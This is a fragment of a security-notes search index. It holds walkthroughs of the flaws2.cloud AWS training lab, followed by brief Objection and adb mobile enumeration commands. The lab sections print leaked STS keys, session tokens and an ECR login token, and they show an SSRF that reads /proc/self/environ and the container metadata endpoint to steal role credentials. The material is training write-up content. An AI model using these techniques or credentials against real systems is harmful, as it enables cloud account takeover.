4Qs9Vtfl9hDUDY6fc1+998jjTbAPs5TnOLDghZTYarc34Nd14El5t9JcFkNheK+lbA=\" We can import those in a profile using aws configure --profile level1 , remember to add the session token as part of the credential config: Warning Temporary (AWS STS) access key IDs - as denoted by the ASIA prefix in the AccessKeyId field - require to add an extra field in the aws profile configuration file: # cat ~/.aws/credentials [level1] aws_access_key_id = <AccessKeyId> aws_secret_access_key = <SecretAccessKey> aws_session_token = <Token> As usual after obtaining new keys, we perform basic enumeration: fog@cloudbreach:~$ aws sts get-caller-identity --profile flaws2-level1 { \"UserId\": \"AROAIBATWWYQXZTTALNCE:level1\", \"Account\": \"653711331788\", \"Arn\": \"arn:aws:sts::653711331788:assumed-role/level1/level1\" } We don't seem to be able to have the right policies (privileges) to use any iam function, but we can list the contents of the S3 bucket located at level1.flaws2.cloud : fog@cloudbreach:~/flaws_2$ aws s3 ls level1.flaws2.cloud --profile flaws2-level1 PRE img/ 2018-11-20 15:55:05 17102 favicon.ico 2018-11-20 21:00:22 1905 hint1.htm 2018-11-20 21:00:22 2226 hint2.htm 2018-11-20 21:00:22 2536 hint3.htm 2018-11-20 21:00:23 2460 hint4.htm 2018-11-20 21:00:17 3000 index.htm 2018-11-20 21:00:17 1899 secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html Visiting secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html leads us to the next level .","title":"Level 1 - Exposed environment variables through Lambda function"},{"location":"aws/training_labs/flaws2/#level-2-elastic-container-registries-ecr","text":"Objective This next level is running as a container at http://container.target.flaws2.cloud/ Just like S3 buckets, other resources on AWS can have open permissions. I'll give you a hint that the ECR (Elastic Container Registry) is named \"level2\". fog@cloudbreach:~/flaws_2$ aws ecr list-images --repository-name level2 --profile flaws2-level1 { \"imageIds\": [ { \"imageDigest\": \"sha256:513e7d8a5fb9135a61159fbfbc385a4beb5ccbd84e5755d76ce923e040f9607e\", \"imageTag\": \"latest\" } ] } https://653711331788.dkr.ecr.us-east-1.amazonaws.com docker login -u AWS -p eyJwYXlsb2FkIjoibWhjK3BHc043T1ZSSEQ0aHo3L1c3RU4yT2MyL3Iyd08rQ3dvZXcwKzRabTByMkZnVDBMeDZDTHBwZW50cnlWLytJN3F2YjRiMGM4OWxpTm9RVmp3aEpUS0tlTGVkR3lQa3ZpMjY3MVhjWjc0OFFTa25TY2YzcWdTTmwzcUtuQjU0REZGaTV4NE9rV3o1bnBEbytDazV5TE1aTzgzOVMxc2szY1FXR1I5OWZ5YUFOanpmaHVrbmZIMTRIT0pZMWx2RHlXTWVBdkNSQUd6OUM4UGc1STAzcVRiUERvNDlEa2V3NVNKeTVnUWlJNDQwaldKUTh0UWRSalMvblF5U2JrNzVFLzdXcE1zNHhtdzVtU2ZXTnp3eDFmRGdLSFlGeVVyMVU4WFpTemMyN1VFUE1BWi9qYlFFU3U5L243Q3RwWnlPemxqN3V4a0VYSnQyakNFdGFjNHZKb0JFNWF5dkFlQ3pUdzc0OVlDbll5a2pHbmRpUzJ6a1RZYkl5K0IwbDVVR0h5S0cvc2xYdUxJVkpSTHNkUTBlV0hUVU5sRmJTSHJHSUZYMmZTbnMzSUoreW1uTnR0TlNrdG1QWGZSMXhjWElVRmc2bXI4OTI2VUdLMG5kVFdFUHNGRmxYeUdvMHNvc3JsUmlxTVVKMlpjMStBN2lLWkFpZk1BZU5iN0ZpTWpPNjdnNTdQckExUjdCVmpXbjdHU1NWdGxpT1Rsc1dyM3BBcmtBMHZKYzFJT2JOaDZVNDY3a2tqWkNDaEZUaEJQcVVQRlgvWWNtNUkyb2d0VzRIKzRhMGRlbnZkQytCT2VUbVNFZVVYNTRyclpwSWNKSVBFdFFPOTJZaFJ0ajVReE9OZnZWQUJYd1hqanJvK1B4RVNiUE9JYktnRG1ISGZZMWhibTdSTWRuYk5ZM3p4T2NOYUFQYjBnSjNHUjNpWUNScjFEOFZuUUE2eTNlOEJHZ2xNRUxKZ2tSMDN5akRBdVpGOEwwVE82VjFhSWhZaE1nYzBoQXpWc2VDdHJLZ0VsdVFxWmxvYWJFeStWWFBPYy9uQytDcTQ3VmpXdGZxN1c2bGRNblFORUpibG1zZEF1WW0yL28yQUVqZW42eWJ5SndNVXZHZ3lRTi9CS0FnMnRMb1Jsb1RXbTNBNUY1Slk0N3YxRm11Q3g4b1lGVldUaU4yMStwU1lSNHpsZ0hteFlRMkY0MDBtMFFMWXFJYU04U1J1M2hkVXRRNW1wSG45SjdvTUhXckZRSHhIK1lzUmlxenVlanN0ZmRzd2lqRUgyLzRyUU9pVk9CclkvQ0hBNHR1YmpqcEtwWXFWVnlPZEtIMXV4Slh1eVBTcHRwSFZlZWc2RTR1T1pVN3dKQzhGNGhMRC9SVFJnWnR6MzhFRXZ3WkEyYWlWMVRORVJsdnI0VUhWUmt2dFUydUl5SlY0MGt0eEVkMEh3cXp6L09sWnpMS1VwbHVkaEZMcjBEVDhMT3AxYkljMTlwU0NLelJVVlBFQThiY0x6UlltZURPakNhc1FNY3pSNi9TK1ZoUXA1M0FCUTNPbHdjMWhER0VzTVdyUXZERVRjQ2dvTXQ3U2F5SSs5V3ZDR01hOFdSQ3RPTFlSSjNONE1MaEdYNm4rVXdQTDloRmt3c0piREgzTTNPYS9NRmR2ZFJZR01JYzJzODgxMWtTM0xYUFVka1J3S25NTkkxYWppcjlTL1ZCUlJ2a2tQOFVSOE42UXJzN291ODY5RGxoSTBXTzZFOWdGcDJNZXY3Yks2M3ByMXBkODBBZ1RVWGF0WlVFWkhKUCtpeEI0SGl6STNmTXVLRjRTaC82MVRjdytUa0hDUkVmWVFiWHFTM0gwPSIsImRhdGFrZXkiOiJBUUVCQUhod20wWWFJU0plUnRKbTVuMUc2dXFlZWtYdW9YWFBlNVVGY2U5UnE4LzE0d0FBQUg0d2ZBWUpLb1pJaHZjTkFRY0dvRzh3YlFJQkFEQm9CZ2txaGtpRzl3MEJCd0V3SGdZSllJWklBV1VEQkFFdU1CRUVEQ05JUGdhVk1qamJvWEF1SkFJQkVJQTdMUFlKWGdvaGw0dW5aZjBwUmVUR1lLUUIwbW5YM1E4d3hBVU5KSE1QY2syQ2dGL2hBQ2NmQlhXaEU5SHNDc3hmUms3SFB5akFEaGlGZjgwPSIsInZlcnNpb24iOiIyIiwidHlwZSI6IkRBVEFfS0VZIiwiZXhwaXJhdGlvbiI6MTY3MTIwMTg1OX0= -e none https://653711331788.dkr.ecr.us-east-1.amazonaws.com docker pull 653711331788.dkr.ecr.us-east-1.amazonaws.com/level2:latest http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud/ root@9c7df3e509cf:/var/www/html# ll total 24 drwxr-xr-x 1 root root 4096 Nov 27 2018 ./ drwxr-xr-x 1 root root 4096 Nov 27 2018 ../ -rw-r--r-- 1 root root 1890 Nov 26 2018 index.htm -rw-r--r-- 1 root root 612 Nov 27 2018 index.nginx-debian.html -rw-r--r-- 1 root root 614 Nov 27 2018 proxy.py -rw-r--r-- 1 root root 49 Nov 26 2018 start.sh root@9c7df3e509cf:/var/www/html# grep 'level3' -R . ./index.htm: Read about Level 3 at <a href=\"http://level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud\">level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud</a>","title":"Level 2 - Elastic Container Registries (ECR)"},{"location":"aws/training_labs/flaws2/#level-3-stealing-keys-from-ecr-metadata-service-via-ssrf","text":"Objective The container's webserver you got access to includes a simple proxy that can be access with: http://container.target.flaws2.cloud/proxy/http://flaws.cloud or http://container.target.flaws2.cloud/proxy/http://neverssl.com HOSTNAME=e7393d8eefbb sha256:2d73de35b78103fa305bd941424443d520524a050b1e0c78c488646c0f0a0621 proxy/file:///proc/self/environ { \"RoleArn\" : \"arn:aws:iam::653711331788:role/level3\" , \"AccessKeyId\" : \"ASIAZQNB3KHGKBJ23GKX\" , \"SecretAccessKey\" : \"NeTGQ4KXuVgpAvifwSbu89c5P2t+U2jqOhUmMGz9\" , \"Token\" : \"IQoJb3JpZ2luX2VjENL//////////wEaCXVzLWVhc3QtMSJHMEUCIQCxXCTsNKHsAz3O2N/Oxnc6yfWfMfhQCxxJyHZulaa1mQIgesLI6mu177DObNIJu7xAnCwLqOpClBXWgmHI1wQcEO0q7AMI+///////////ARADGgw2NTM3MTEzMzE3ODgiDIq+ivyr8Ofng2tMxCrAAyC8jldxrR4gRfqb+Tv/u5WRu/Mjafm6Q8S5M8Kykn9fiKF3sBGFXZg/2tU+UR0JVQvV8gyeoAnIK5F8P5WLOXcEelT+B3ZKmSI5m7o8SIcq1qsTRwMtTOnjLhhVYPVAXPogFMk0ZsVlGSCKoTTjN2dPpSIh4dSSn9nrdG/T9zg+WsA5s9J6VZqFQ6ggym0LGBUpvkAj780IEDs4WNwEqJeO5myChq0kqqcXA5QSFEMPDGu/sZnPVSObrJu/QjPstPF9NEf/4cTZEkW3P01HhfVceQeryJP1RFBnt1Wz0Q4L7DiB2xETA1bJoicsaA3/JcLO2UvPRpqKvClgv0qlBuGlyq9MGtbsd7X1JqdlOLsAspCyuv46aTOeuV3uuAfu6w+T9g0MYEcvqRGgHJG1fUyR9UWWBZwTkx8rnR9kQ9yRHNK117gdYeuLxEsjsT64PzAvATojIlGcrw4eKivv+mrr6O/Sr0SztCv1NajMtoMvYdw9X3iGWwnLUciwypQ+nFOoERlJwXqbP7nvY34YjJcdx2WfzNuT1ie0AtuwLUt9HX5tJyYKsR8kzhrFyUx5eAfv++vNRQcXbpE5Ig9MtoAwnaPvnAY6pQHOC2Snj9DJZVR85prIw1HQImQo+4Nq9TgFHoKR6asdPGYN5jp0VtIW8P/+zSKSXqEZM+ALeTmzbAn1nIbtsNNkYspQL21VeS4wE2hNQlt6PxZnOyRQBEdLCe2IAGDIgzaBg+TD2tZ24bJAMqrPVkF5q+tjf0ai0QE0kqUSV6BSNo248wO0WSEArk4xoxM1eJ4lWGBD70SouvHnLZd7kjcWS4BLRis=\" , \"Expiration\" : \"2022-12-16T08:02:05Z\" } HOSTNAME=ip-172-31-48-55.ec2.internalHOME=/rootAWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80AWS_EXECUTION_ENV=AWS_ECS_FARGATEAWS_DEFAULT_REGION=us-east-1ECS_CONTAINER_METADATA_URI_V4=http://169.254.170.2/v4/f6209e98011942c28c1d74f589770aec-3779599274ECS_CONTAINER_METADATA_URI=http://169.254.170.2/v3/f6209e98011942c28c1d74f589770aec-3779599274PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binAWS_REGION=us-east-1PWD=/ /v2/credentials/2fdf39e7-50cf-4e11-a47a-533525342c80 fog@cloudbreach:~/flaws_2/level3$ aws s3 ls --profile flaws2-level3 2018-11-20 14:50:08 flaws2.cloud 2018-11-20 13:45:26 level1.flaws2.cloud 2018-11-20 20:41:16 level2-g9785tw8478k4awxtbox9kk3c5ka8iiz.flaws2.cloud 2018-11-26 14:47:22 level3-oc6ou6dnkw8sszwvdrraxc5t5udrsw3s.flaws2.cloud 2018-11-27 15:37:27 the-end-962b72bjahfm5b4wcktm8t9z4sapemjb.flaws2.cloud","title":"Level 3 - Stealing Keys from ECR Metadata Service via SSRF"},{"location":"mobile/enumeration/","text":"Objection Launch Target Activity adb shell am start -n <package_name>/<package_name.activity> Search for Registered Deeplinks adb shell dumpsys package <package_name> List Activites in Hooked Application android hooking list activities Search for Available Methods in Activity android hooking search methods <package> <activity>","title":"Objection"},{"location":"mobile/enumeration/#objection","text":"","title":"Objection"},{"location":"mobile/enumeration/#launch-target-activity","text":"adb shell am start -n <package_name>/<package_name.activity>","title":"Launch Target Activity"},{"location":"mobile/enumeration/#search-for-registered-deeplinks","text":"adb shell dumpsys package <package_name>","title":"Search for Registered Deeplinks"},{"location":"mobile/enumeration/#list-activites-in-hooked-application","text":"android hooking list activities","title":"List Activites in Hooked Application"},{"location":"mobile/enumeration/#search-for-available-methods-in-activity","text":"android hooking search methods <package> <activity>","title":"Search for Available Methods in Activity"}]}